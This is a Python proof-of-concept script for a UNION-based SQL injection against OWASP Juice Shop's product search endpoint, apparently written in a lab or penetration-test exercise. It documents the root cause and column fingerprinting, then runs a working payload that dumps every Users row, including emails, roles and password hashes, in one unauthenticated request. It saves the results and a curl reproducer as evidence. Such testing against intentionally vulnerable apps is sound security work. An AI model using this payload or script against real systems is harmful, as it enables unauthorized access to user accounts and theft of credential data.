#!/usr/bin/env python3
"""
c05-sqli-union-dump — UNION-based SQL injection PoC  (OWASP Juice Shop)
=======================================================================

Target   : http://host.docker.internal:3000
Endpoint : GET /rest/products/search?q=<injection>
Backend  : SQLite  (verbose errors -> "SQLITE_ERROR: ...")
Auth     : NONE required (unauthenticated endpoint)

ROOT CAUSE
----------
The product search handler concatenates the raw `q` parameter into SQL:

    SELECT * FROM Products
     WHERE ((name LIKE '%<q>%' OR description LIKE '%<q>%') AND deletedAt IS NULL)
     ORDER BY name;

`q = apple'))--` closes both LIKE string literals and the WHERE grouping
parenthesis, commenting out the remainder of the query, which allows an
attacker-controlled UNION SELECT to be appended.

COLUMN FINGERPRINTING
---------------------
Products is projected with 10 columns:
    id, name, description, price, deluxePrice, image,
    alternateImages, createdAt, updatedAt, deletedAt

Probing UNION SELECT 1..N showed N=8 and N=9 fail with
"SELECTs to the left and right of UNION do not have the same number of
result columns" while N=10 succeeds -> 10 columns.

EXFILTRATION PAYLOAD
--------------------
    apple')) UNION ALL SELECT id,email,role,password,deletedAt,1,1,1,1,1
      FROM Users --

    id          -> JSON "id"
    email       -> JSON "name"
    role        -> JSON "description"
    password    -> JSON "price"        (hash, bonus loot)
    deletedAt   -> JSON "deluxePrice"  (soft-delete marker)

UNION ALL (not UNION) is used so duplicate projections are never
de-duplicated by SQLite. Note user id=17 has the literal email "demo"
(no '@'), which is why a naive "contains @" heuristic silently loses a row —
the filter below instead drops the benign Juice Shop product row(s).

RESULT
------
All 24 Users rows exfiltrated in ONE unauthenticated HTTP request.
"""
import json
import sys
import urllib.parse
import urllib.request

BASE = "http://host.docker.internal:3000"
ENDPOINT = BASE + "/rest/products/search"
EVIDENCE = "/workspace/evidence"

PAYLOAD = ("apple')) UNION ALL SELECT id,email,role,password,deletedAt,"
           "1,1,1,1,1 FROM Users --")


def inject(q: str):
    url = ENDPOINT + "?q=" + urllib.parse.quote(q, safe="")
    req = urllib.request.Request(url, headers={"Accept": "application/json"})
    with urllib.request.urlopen(req, timeout=15) as r:
        body = r.read().decode("utf-8", "replace")
    return json.loads(body)


def main():
    print("[*] Target  :", ENDPOINT)
    print("[*] Backend : SQLite (from leaked error banner)")
    print("[*] Payload : q=" + PAYLOAD)
    print()

    rows = inject(PAYLOAD).get("data") or []
    if not rows:
        print("[!] Injection returned no rows — payload or target changed")
        return 1

    # Row 17 ("demo") has no '@', so identify loot by the injected marker
    # (price == 32-hex password hash) rather than by email shape.
    records = []
    for r in rows:
        ph = r.get("price")
        if isinstance(ph, str) and len(ph) == 32 and all(c in "0123456789abcdef" for c in ph):
            records.append({
                "id": r.get("id"),
                "email": r.get("name"),
                "role": r.get("description"),
                "password_hash": ph,
                "deleted_at": r.get("deluxePrice"),
            })
    records.sort(key=lambda x: x["id"])

    print(f"[+] Exfiltrated {len(records)} Users rows, unauthenticated (single request)")
    print()
    print(f"{'ID':<4}{'EMAIL':<32}{'ROLE':<12}{'DELETED'}")
    print("-" * 72)
    for rec in records:
        print(f"{rec['id']:<4}{rec['email']:<32}{rec['role']:<12}"
              f"{'yes' if rec['deleted_at'] else '-'}")

    with open(f"{EVIDENCE}/c5_users_full.json", "w") as f:
        json.dump(records, f, indent=2)

    # Deliverable: first 10 rows, email + role
    out = f"{EVIDENCE}/c5_users.txt"
    with open(out, "w") as f:
        for rec in records[:10]:
            f.write(f"{rec['email']}\t{rec['role']}\n")

    # Reproducible raw request (curl one-liner) for the report
    with open(f"{EVIDENCE}/c5_poc_curl.sh", "w") as f:
        f.write("#!/bin/sh\n")
        f.write("# UNION-based SQLi -> full Users table dump (unauthenticated)\n")
        f.write("curl -s -G --data-urlencode \"q=" + PAYLOAD + "\" \\\n")
        f.write("     '" + ENDPOINT + "'\n")

    print()
    print(f"[+] {out}  ({min(10, len(records))} rows: email<TAB>role)")
    print(f"[+] {EVIDENCE}/c5_users_full.json  (all {len(records)} rows + hashes)")
    print(f"[+] {EVIDENCE}/c5_poc_curl.sh      (raw reproducer)")
    return 0


if __name__ == "__main__":
    sys.exit(main())
